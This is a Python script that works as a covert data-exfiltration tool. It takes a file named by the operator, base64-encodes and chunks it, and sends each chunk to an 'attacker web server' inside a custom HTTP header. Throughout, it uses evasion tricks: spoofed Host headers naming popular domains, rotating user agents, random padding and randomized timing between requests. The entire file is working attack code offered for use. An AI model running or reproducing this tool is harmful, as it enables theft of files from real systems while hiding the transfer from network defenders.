import base64
import re
import os
import urllib.request
import string
import random
import time

letters = string.ascii_letters
ts = str(time.time())



# Asks user to input file for exfil
file_name = input("Enter File Name\n")
f = open(file_name, "r")
exfil_data = (f.read())

#Asks user where to send file for exfil
attacker_server = input("Enter Attacker Web Server\n")
url = 'http://'+ attacker_server+"/"

#List of user agents, will be used later to randomly populate user agent header
user_agent_list = ['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:90.0) Gecko/20100101 Firefox/90.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:89.0) Gecko/20100101 Firefox/89.0', 'Mozilla/5.0 (X11; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0', 'Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.55', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.67', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.64', 'Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36 Edg/92.0.902.62', 'Mozilla/5.0 (X11; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 Edg/91.0.864.70', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 Edg/91.0.864.71', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.115 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1 Safari/605.1.15', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 OPR/77.0.4054.203', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 OPR/77.0.4054.277', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:90.0) Gecko/20100101 Firefox/90.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0', 'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.106 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:91.0) Gecko/20100101 Firefox/91.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36', 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36', 'Mozilla/5.0 (X11; Fedora; Linux x86_64; rv:90.0) Gecko/20100101 Firefox/90.0', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.2 Safari/605.1.15', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.164 Safari/537.36 OPR/77.0.4054.275', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36', 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.77 Safari/537.36', 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:90.0) Gecko/20100101 Firefox/90.0', 'Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36']

#List of common domains, will be used later to randomly populate host header
domain_list = ['google.com', 'facebook.com', 'doubleclick.net', 'google-analytics.com', 'akamaihd.net', 'googlesyndication.com', 'googleapis.com', 'googleadservices.com', 'facebook.net', 'youtube.com', 'twitter.com', 'scorecardresearch.com', 'microsoft.com', 'ytimg.com', 'googleusercontent.com', 'apple.com', 'msftncsi.com', '2mdn.net', 'googletagservices.com', 'adnxs.com', 'yahoo.com', 'serving-sys.com', 'akadns.net', 'bluekai.com', 'ggpht.com', 'rubiconproject.com', 'verisign.com', 'addthis.com', 'crashlytics.com', 'amazonaws.com', 'quantserve.com', 'akamaiedge.net', 'live.com', 'googletagmanager.com', 'revsci.net', 'adadvisor.net', 'openx.net', 'digicert.com', 'pubmatic.com', 'agkn.com', 'instagram.com', 'mathtag.com', 'gmail.com', 'rlcdn.com', 'linkedin.com', 'yahooapis.com', 'chartbeat.net', 'twimg.com', 'turn.com', 'crwdcntrl.net', 'demdex.net', 'betrad.com', 'flurry.com', 'newrelic.com', 'yimg.com', 'youtube-nocookie.com', 'exelator.com', 'acxiom-online.com', 'imrworldwide.com', 'amazon.com', 'fbcdn.net', 'windowsupdate.com', 'mookie1.com', 'rfihub.com', 'omniroot.com', 'adsrvr.org', 'nexac.com', 'bing.com', 'skype.com', 'godaddy.com', 'sitescout.com', 'tubemogul.com', 'contextweb.com', 'w55c.net', 'chartbeat.com', 'akamai.net', 'jquery.com', 'adap.tv', 'criteo.com', 'krxd.net', 'optimizely.com', 'macromedia.com', 'comodoca.com', 'casalemedia.com', 'pinterest.com', 'adsymptotic.com', 'symcd.com', 'atwola.com', 'adobe.com', 'msn.com', 'adsafeprotected.com', 'tapad.com', 'truste.com', 'symantecliveupdate.com', 'atdmt.com', 't.co', 'avast.com', 'google.co.in', 'spotxchange.com', 'tidaltv.com', 'adtechus.com', 'everesttech.net', 'addthisedge.com', 'hola.org', 'btrll.com', 'gwallet.com', 'liverail.com', 'windows.com', 'burstnet.com', 'disqus.com', 'nr-data.net', 'p-td.com', 'geotrust.com', 'admob.com', 'crittercism.com', 'bizographics.com', 'ru4.com', 'wtp101.com', 'ksmobile.com', 'msads.net', 'thawte.com', 'lijit.com', 'cloudflare.com', '360yield.com', 'dropbox.com', 'simpli.fi', 'smartadserver.com', 'globalsign.com', 'mlnadvertising.com', 'chango.com', 'connexity.net', 'moatads.com', 's-msn.com', 'entrust.net', 'tribalfusion.com', 'domdex.com', 'google.com.tr', 'whatsapp.net', 'ntp.org', 'amazon-adsystem.com', 'viber.com', 'disquscdn.com', 'yandex.ru', 'doubleverify.com', 'bkrtx.com', 'criteo.net', 'outbrain.com', 'questionmarket.com', 'adform.net', 'yieldmanager.com']

#Lengths of the list for domains and user_agents
domain_list_len = len(domain_list)
agent_list_len = len(user_agent_list)

#Converts exfil data data into base64
exfil_string_bytes = exfil_data.encode("ascii")
base64_bytes = base64.b64encode(exfil_string_bytes)
base64_string = base64_bytes.decode("ascii")
exfil_base64 = (f"{base64_string}")
#print (len(exfil_base64))

#Chunks base64 exfil data
exfil_list = []
while exfil_base64:
    exfil_list.append(exfil_base64[:100])
    exfil_base64 = exfil_base64[100:]

#Counts total number of data chunks
exfil_list_len = len(exfil_list)




#Converts filename into base64
file_string_bytes = file_name.encode("ascii")
file_bytes = base64.b64encode(file_string_bytes)
file_string = file_bytes.decode("ascii")
file_base64 = (f"{file_string}")
#print (file_base64)




# Percentage thresholds for progress
percent_25 = int(exfil_list_len/4)
percent_50 = int(exfil_list_len/4*2)
percent_75 = int(exfil_list_len/4*3)
tick_count = int(exfil_list_len/20)

# Converts timestamp into base64
time_string_bytes = ts.encode("ascii")
time_bytes = base64.b64encode(time_string_bytes)
time_string = time_bytes.decode("ascii")
time_base64 = (f"{time_string}")
#print (time_base64)

#Loops through the total number of data chunks
for x in range(0, exfil_list_len):
    #builds the exfil string for each chunk
    secrets = (time_base64+"."+file_base64+"."+str(x).zfill(3)+"."+exfil_list[x])

    #randomly chooses a user agent and domain from our lists above
    user_agent_num= random.randint(0, agent_list_len-1)
    user_agent_roll = user_agent_list[user_agent_num]

    domain_num= random.randint(0, domain_list_len-1)
    domain_roll = domain_list[domain_num]

    #generate random length string for packet size variation
    size_variation = ( ''.join(random.choice(letters) for i in range(50,100)) )

    # compiles and sends requests to attacker contolled machine
    req = urllib.request.Request(url, headers={'Host': domain_roll, 'User-Agent': user_agent_roll, 'Secret': secrets, 'Proxy-Authenticate' :size_variation})
    with urllib.request.urlopen(req) as response:
        the_page = response.read()

# Prints status updates as it works through the file chunks
    if x == percent_25:
        print ("25% Complete")
    if x == percent_50:
        print ("50% Complete")
    if x == percent_75:
        print ("75% Complete")
    if x % tick_count == 0:
        print ("-")
    #Randomizes the timing of http requests outbound
    time.sleep(random.randint(2,15))

print ("Done!")

#Sends one final packet without the secret header to initiate closure of HTTP server and aggregation of data
req = urllib.request.Request(url, headers={'Host': domain_roll, 'User-Agent': user_agent_roll, 'Proxy-Authenticate' :size_variation})
with urllib.request.urlopen(req) as response:
    the_page = response.read()
